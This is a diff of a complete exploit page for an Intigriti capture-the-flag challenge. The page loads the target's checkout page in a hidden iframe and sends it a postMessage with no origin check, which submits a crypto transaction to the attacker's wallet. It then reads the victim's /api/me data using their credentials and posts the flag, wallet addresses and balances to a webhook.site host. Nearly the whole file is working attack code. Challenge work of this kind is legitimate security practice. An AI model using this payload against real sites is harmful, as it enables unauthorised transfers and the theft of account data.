@@ -1,136 +1,214 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>exploit</title>
+    <title>Intigriti Challenge - Timing-Fixed Exploit</title>
     <style>
         body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
         h1 { color: #0f0; }
-        #status { color: #ff0; font-size: 18px; }
-        #log { color: #0ff; font-size: 12px; max-height: 300px; overflow-y: auto; }
+        #status { color: #ff0; font-size: 18px; margin: 10px 0; }
+        #log { color: #0ff; font-size: 11px; max-height: 350px; overflow-y: auto; background: #000; padding: 10px; border: 1px solid #333; }
         iframe { display: none; }
+        .info { background: #222; padding: 10px; border: 1px solid #444; margin: 10px 0; font-size: 12px; }
     </style>
 </head>
 <body>
-    <h1>Intigriti Challenge - iframe Exploit (No Popups)</h1>
-    <p id="status">Initializing...</p>
-    <pre id="log">Waiting for bot visit...</pre>
+    <h1>Intigriti Challenge - Exploit with Timing Fix</h1>
 
-    <!-- Hidden iframe for checkout.html -->
-    <iframe id="checkoutFrame" src="about:blank"></iframe>
+    <div class="info">
+        <strong>Method:</strong> iframe + postMessage<br>
+        <strong>Target:</strong> checkout.html (no origin validation on postMessage)<br>
+        <strong>Timing:</strong> Wait for iframe to fully load AND fetch wallets before sending message
+    </div>
+
+    <p id="status">Initializing...</p>
+    <pre id="log">[EXPLOIT] Waiting for bot visit...</pre>
+
+    <!-- Hidden iframe - will load checkout.html same-origin -->
+    <iframe id="checkoutFrame" name="checkoutFrame"></iframe>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
         const WEBHOOK = 'https://webhook.site/9480469e-afda-45c7-af6d-93f7006a27b5';
+        const CURRENCY = '1337COIN';
+        const AMOUNT = 1;
+
+        let step = 0;
 
         function log(message, data = {}) {
-            console.log(message, data);
+            step++;
+            console.log(`[${step}] ${message}`, data);
             const logEl = document.getElementById('log');
-            logEl.textContent += '\n' + message;
+            const ts = new Date().toISOString().split('T')[1].split('.')[0];
+            logEl.textContent += '\n[' + ts + '] [' + step + '] ' + message;
 
+            // Send to webhook
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 mode: 'no-cors',
                 body: JSON.stringify({
                     timestamp: new Date().toISOString(),
+                    step: step,
                     message: message,
                     data: data
                 })
-            }).catch(() => {});
+            }).catch(e => console.log('Webhook error:', e));
         }
 
-        log('PAGE_LOADED');
-        document.getElementById('status').textContent = 'Loading checkout...';
+        log('EXPLOIT_PAGE_LOADED', { url: window.location.href });
 
         async function exploit() {
+            document.getElementById('status').textContent = '[Step 1] Loading checkout.html in iframe...';
+
             try {
-                // Load checkout.html in iframe (same-origin)
+                // STEP 1: Create iframe and load checkout.html
                 const iframe = document.getElementById('checkoutFrame');
-                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
+                const checkoutUrl = TARGET + '/checkout.html?currency=' + CURRENCY + '&price=' + AMOUNT;
 
-                log('IFRAME_LOADING', { src: iframe.src });
+                log('STEP1_LOADING_IFRAME', { url: checkoutUrl });
 
-                // Wait for iframe to load
-                await new Promise((resolve) => {
-                    iframe.onload = resolve;
-                    setTimeout(resolve, 3000); // Fallback timeout
+                // Create a promise that resolves when iframe is fully loaded
+                const iframeLoadPromise = new Promise((resolve) => {
+                    let loadCount = 0;
+
+                    // Method 1: onload event
+                    iframe.onload = () => {
+                        loadCount++;
+                        log('IFRAME_ONLOAD_FIRED', { count: loadCount });
+                        if (loadCount >= 1) {
+                            // Wait additional time for async loadWallets() to complete
+                            setTimeout(resolve, 3000);
+                        }
+                    };
+
+                    // Method 2: Timeout fallback
+                    setTimeout(() => {
+                        log('IFRAME_TIMEOUT_FALLBACK');
+                        resolve();
+                    }, 8000);
                 });
 
-                log('IFRAME_LOADED');
+                // Load the iframe
+                iframe.src = checkoutUrl;
 
-                // Get the iframe's window
+                // Wait for iframe to be ready
+                await iframeLoadPromise;
+
+                log('STEP1_COMPLETE_IFRAME_READY');
+                document.getElementById('status').textContent = '[Step 2] Preparing postMessage...';
+
+                // STEP 2: Get iframe window and verify we can access it
                 const iframeWindow = iframe.contentWindow;
+
                 if (!iframeWindow) {
                     log('ERROR_NO_IFRAME_WINDOW');
-                    document.getElementById('status').textContent = 'Error: Cannot access iframe window';
+                    document.getElementById('status').textContent = 'ERROR: Cannot access iframe window';
                     return;
                 }
 
-                document.getElementById('status').textContent = 'Sending transaction...';
-                log('SENDING_POSTMESSAGE', {
-                    toAddress: OUR_WALLET,
-                    currency: '1337COIN',
-                    amount: 1
-                });
+                log('STEP2_IFRAME_WINDOW_ACCESSIBLE');
 
-                // Send postMessage to iframe (NO origin check!)
+                // Give more time for loadWallets() async fetch to complete
+                log('WAITING_FOR_WALLET_FETCH');
+                await new Promise(r => setTimeout(r, 2000));
+
+                // STEP 3: Send the malicious postMessage
+                document.getElementById('status').textContent = '[Step 3] Sending malicious postMessage...';
+
+                const transactionData = {
+                    toAddress: OUR_WALLET,
+                    currency: CURRENCY,
+                    amount: AMOUNT
+                };
+
+                log('STEP3_SENDING_POSTMESSAGE', transactionData);
+
+                // VULNERABILITY: No origin check in checkout.html postMessage handler!
                 iframeWindow.postMessage({
                     type: 'submitTransaction',
-                    transaction: {
-                        toAddress: OUR_WALLET,
-                        currency: '1337COIN',
-                        amount: 1
-                    }
+                    transaction: transactionData
                 }, '*');
 
-                log('POSTMESSAGE_SENT');
-                document.getElementById('status').textContent = 'Transaction sent! Waiting for flag...';
+                log('STEP3_POSTMESSAGE_SENT');
+                document.getElementById('status').textContent = '[Step 4] Transaction submitted! Checking for flag...';
 
-                // Wait for transaction, then check for flag
-                setTimeout(async () => {
-                    log('CHECKING_FLAG');
-                    const response = await fetch(TARGET + '/api/me', { credentials: 'include' });
-                    const data = await response.json();
+                // STEP 4: Wait for transaction to process, then check for flag
+                // The transaction takes time to complete and flag to be awarded
+                await new Promise(r => setTimeout(r, 5000));
 
-                    log('API_ME_RESPONSE', {
-                        hasFlag: !!data.flag,
-                        flag: data.flag || 'none',
-                        wallets: data.wallets?.map(w => ({ currency: w.currency, address: w.address }))
-                    });
+                await checkForFlag();
+                await new Promise(r => setTimeout(r, 3000));
+                await checkForFlag();
+                await new Promise(r => setTimeout(r, 3000));
+                await checkForFlag();
 
-                    if (data.flag) {
-                        document.getElementById('status').textContent = 'FLAG: ' + data.flag;
-                        log('FLAG_FOUND', { flag: data.flag });
-                        alert('FLAG: ' + data.flag);
-                    } else {
-                        document.getElementById('status').textContent = 'No flag yet - checking again...';
-                        log('NO_FLAG_YET_RETRY');
-
-                        // Retry once more
-                        setTimeout(async () => {
-                            const r2 = await fetch(TARGET + '/api/me', { credentials: 'include' });
-                            const d2 = await r2.json();
-                            log('API_ME_RETRY', { hasFlag: !!d2.flag, flag: d2.flag || 'none' });
-                            if (d2.flag) {
-                                document.getElementById('status').textContent = 'FLAG: ' + d2.flag;
-                                log('FLAG_FOUND_RETRY', { flag: d2.flag });
-                                alert('FLAG: ' + d2.flag);
-                            }
-                        }, 3000);
-                    }
-                }, 5000);
+                document.getElementById('status').textContent = 'Exploit complete. Check webhook for details.';
+                log('EXPLOIT_COMPLETE');
 
             } catch (error) {
-                log('ERROR', { error: error.message, stack: error.stack });
-                document.getElementById('status').textContent = 'Error: ' + error.message;
+                log('EXPLOIT_EXCEPTION', { error: error.message, stack: error.stack });
+                document.getElementById('status').textContent = 'ERROR: ' + error.message;
             }
         }
 
-        // Start when page loads
+        async function checkForFlag() {
+            log('CHECKING_FLAG');
+
+            try {
+                const response = await fetch(TARGET + '/api/me', {
+                    credentials: 'include',
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                const data = await response.json();
+
+                log('API_ME_RESPONSE', {
+                    status: response.status,
+                    ok: response.ok,
+                    hasFlag: !!data.flag,
+                    flag: data.flag || 'none',
+                    walletCount: data.wallets?.length || 0,
+                    wallets: data.wallets?.map(w => ({
+                        currency: w.currency,
+                        address: w.address?.substring(0, 16) + '...',
+                        balance: w.balance
+                    }))
+                });
+
+                if (data.flag) {
+                    document.getElementById('status').textContent = '✅✅✅ FLAG FOUND: ' + data.flag + ' ✅✅✅';
+                    log('FLAG_SUCCESS', { flag: data.flag });
+                    alert('gigawatz\n\nFLAG: ' + data.flag);
+
+                    // Send success to webhook
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            timestamp: new Date().toISOString(),
+                            message: 'MISSION_SUCCESS',
+                            data: { flag: data.flag }
+                        })
+                    }).catch(() => {});
+
+                    return true;
+                } else {
+                    log('FLAG_NOT_YET', { reason: 'Transaction may still be processing' });
+                    return false;
+                }
+
+            } catch (error) {
+                log('FLAG_CHECK_ERROR', { error: error.message });
+                return false;
+            }
+        }
+
+        // Start exploit when page loads
         window.onload = () => {
             log('WINDOW_ONLOADED');
-            exploit();
+            setTimeout(exploit, 500);
         };
     </script>
 </body>
